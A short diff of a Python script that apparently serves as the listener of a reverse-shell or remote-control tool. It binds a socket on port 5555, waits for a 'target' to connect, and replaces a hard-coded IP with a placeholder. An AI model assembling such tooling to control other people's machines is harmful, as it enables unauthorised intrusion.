@@ -57,7 +57,7 @@ def tar_commun():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.0.105', 5555))
+sock.bind(('Your Ip Address', 5555))
 print('[+}LISTENING FOR INCOMING CONNECTIONS')
 sock.listen(5)
 target, ip = sock.accept()
